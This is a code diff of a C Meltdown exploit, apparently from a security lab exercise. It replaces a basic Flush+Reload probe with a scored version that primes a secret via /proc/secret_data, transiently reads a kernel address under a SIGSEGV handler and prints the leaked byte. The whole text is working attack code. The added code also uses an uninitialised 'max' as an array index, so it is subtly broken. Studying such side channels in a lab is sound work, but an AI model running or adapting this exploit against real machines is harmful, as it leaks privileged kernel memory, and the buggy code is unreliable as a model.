@@ -8,8 +8,6 @@
 #include<emmintrin.h>
 #include<x86intrin.h>
 
-// Flush + Reload
-
 uint8_t array[256*4096];
 #define CACHE_HIT_THRESOLD (80)
 #define DELTA 1024
@@ -26,37 +24,23 @@ void flushSideChannel() {
 	}
 }
 
-void reloadSideChannel() {
-	int junk = 0;
-	register uint64_t time1, time2;
-	volatile uint8_t *addr;
+static int scores[256];
 
+void reloadSideChannelImproved() {
 	int i;
+	volatile uint8_t *addr;
+	register uint64_t time1, time2;
+	int junk = 0;
+
 	for(i = 0; i < 256; i++) {
-		addr = &array[i*4096 + DELTA];
+		addr = &array[i * 4096 + DELTA];
 		time1 = __rdtscp(&junk);
 		junk = *addr;
 		time2 = __rdtscp(&junk) - time1;
-		if (time2 <= CACHE_HIT_THRESOLD) {
-			printf("array[%d*4096 + %d] is in cache\n",i,DELTA);
-			printf("The secret = %d\n",i);
+		if (time2 < CACHE_HIT_THRESOLD) {
+			scores[i]++;
 		}
 	}
-}
-
-// Signal Handler
-static sigjmp_buf jbuf;
-static void catch_segv() {
-	siglongjmp(jbuf, 1);
-}
-
-// Meltdown attack
-
-void meltdown(unsigned long kernel_data_addr) {
-	char kernel_data = 0;
-
-	kernel_data = *(char*)kernel_data_addr;
-	array[7 * 4096 + DELTA] += 1;
 }
 
 void meltdown_asm(unsigned long kernel_data_addr) {
@@ -77,17 +61,54 @@ void meltdown_asm(unsigned long kernel_data_addr) {
 	array[kernel_data * 4096 + DELTA] += 1;
 }
 
+static sigjmp_buf jbuf;
+static void catch_segv() {
+	siglongjmp(jbuf, 1);
+}
+
 int main(int argc, char** argv) {
+	int i, j, ret = 0;
+
 	signal(SIGSEGV, catch_segv);
 
-	flushSideChannel();
-
-	if (sigsetjmp(jbuf, 1)==0) {
-		meltdown_asm(0xf90fb000);
-	} else {
-		printf("Memory access violation\n");
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if (fd<0) {
+		perror("open");
+		return -1;
 	}
 
-	reloadSideChannel();
+	memset(scores, 0, sizeof(scores));
+	flushSideChannel();
+
+	for(i = 0; i < 1000; i++) {
+		ret = pread(fd, NULL, 0, 0);
+		if (ret < 0) {
+			perror("open");
+			break;
+		}
+	}
+
+	for (j = 0; j < 256; j++) {
+		_mm_clflush(&array[j*4096 + DELTA]);
+	}
+
+	if (sigsetjmp(jbuf, 1) == 0) {
+		meltdown_asm(0xf90fb000);
+	}
+
+	reloadSideChannelImproved();
+
+	int max;
+	for (i = 0; i < 256; i++) {
+		if (scores[max] < scores[i]) {
+			max = i;
+		}
+	}
+
+	printf("The secret value is %d %c\n",max, max);
+	printf("The number of hits is %d\n",scores[max]);
+
 	return 0;
 }
+
+
